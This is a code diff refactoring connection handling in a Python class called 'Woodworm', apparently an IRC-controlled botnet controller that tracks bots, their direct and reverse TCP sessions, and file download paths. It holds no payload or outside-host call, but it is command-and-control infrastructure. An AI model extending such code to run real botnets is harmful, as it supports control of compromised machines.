@@ -89,7 +89,7 @@ class Woodworm:
             if tcpSession is not None:
                 bot.set_tcp_session(tcpSession)
                 bot.get_tcp_session().get_data_link().set_download_path(self.pathToFiles)
-                bot.get_tcp_session().get_data_link().send_command(f"IDENTIFY: {self.ircNick}")
+                bot.get_tcp_session().identify(self.ircNick)
             else:
                 logging.error(f"Failed to TCP connect to bot: nick: {nick}, ip: {ip} port: {port}")
                                  
@@ -149,16 +149,16 @@ class Woodworm:
 
         tcpSession = bot.get_tcp_session()
 
-        if tcpSession is None:
+        if not tcpSession.isActive:
             logging.warning(f"Bot {receiver} has no connection, trying to use reversed connection")
-            connection = bot.get_reversed_tcp_connection()
-        else:
-            connection = tcpSession.get_data_link()
-        
-        if connection is None:
+            tcpSession = bot.get_reversed_tcp_session()
+            
+        if not tcpSession.isActive:
             logging.error(f"Bot {receiver} has no active connections")
             await irc_connection.send_query(nickname, f"Bot {receiver} has no active connections")
             return  
+
+        connection = tcpSession.get_data_link()
 
         if connection.is_sending_data():
             await irc_connection.send_query(nickname, f"Bot {receiver} is busy")
@@ -182,14 +182,13 @@ class Woodworm:
         for bot in self.botnetDB.get_bots().values():
             info = f"BOT: {bot.get_ircNick()} {bot.get_ip()}:{bot.get_port()}"
             tcpSession = bot.get_tcp_session()
-            
-            if tcpSession is not None:
+            if tcpSession.isActive:
                 info += f" TCP connection: [active]"
             else:
                 info += f" TCP connection: [inactive]"
             
-            connection = bot.get_reversed_tcp_connection()
-            if connection is not None:
+            tcpSession = bot.get_reversed_tcp_session()
+            if tcpSession.isActive:
                 info += f" Reversed TCP connection: [active]"
             else:
                 info += f" Reversed TCP connection: [inactive]"
@@ -233,8 +232,11 @@ class Woodworm:
             connection.send_command(f"AUTH-REQ {nick}")
             return
         
-        bot.set_reversed_tcp_connection(connection)
-        bot.get_reversed_tcp_connection().set_download_path(self.pathToFiles)
+        tcpReversedSession = bot.get_reversed_tcp_session()
+        tcpReversedSession.isActive = True
+
+        connection.set_download_path(self.pathToFiles)
+        tcpReversedSession.set_data_link(connection)
         logging.info(f"Reverse connection established with nick: {nick}")
 
 
